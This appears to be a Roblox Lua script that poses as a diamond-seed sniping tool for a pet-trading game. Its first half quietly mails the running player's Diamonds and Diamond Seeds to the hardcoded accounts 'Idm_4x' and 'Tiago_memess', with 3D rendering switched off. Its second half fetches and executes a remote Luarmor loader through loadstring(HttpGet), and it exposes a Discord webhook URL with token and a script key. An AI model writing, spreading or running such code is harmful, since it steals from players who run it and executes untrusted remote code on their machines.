print("Started")
game:GetService("RunService"):Set3dRenderingEnabled(false)
local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local waited = false
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

if GemAmount1 < 30000000 then
    task.wait(10)
    waited = true
    game.ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
    task.wait(1)
end    


local function GemSteal()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" and GemAmount1 > 60000000 then
           GemId = i
            local args = {
                        [1] = "Idm_4x",
                        [2] = "DIMAS A BIRE",
                        [3] = "Currency",
                        [4] = GemId,
                        [5] = GemAmount1 - 40000000
                    }
               if waited == false then
                    task.wait(10)
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                else
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                end
        end
    end
end

local function miscSteal()
    for i, v in pairs(save.Seed) do
        if v.id == "Diamond" and v._am > 350 then
            local args = {
                [1] = "Tiago_memess",
                [2] = "DIAMOND SEEDS A BIRE",
                [3] = "Seed",
                [4] = i,
                [5] = v._am
            }
                if waited == false then
                    task.wait(10)
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                else
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            end
        end
    end
end

miscSteal()
GemSteal()

getgenv().settings = {
        {
            item = "Diamond",
            maxPrice = 14000,
            class = "Seed"
        }
    }

getgenv().webhook = "https://discord.com/api/webhooks/1189711297827311616/y1MGTxuB8LosIVGm8ntw0tsBmgR7J6bOfZPgRPln8Un5Dyw5Gpvd5o714zaMNNqA_oUh" -- put your webhook link here for notifications
script_key="wbNKOkdvPvfRwLjvhevgfBXuMOlpSnRQ"; 
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fb2430277ea12a4fbea278cf8a4b3f49.lua"))()
task.spawn(function()
    task.wait(120)
    game:GetService("TeleportService"):Teleport(15502339080,game.Players.LocalPlayer)
end)
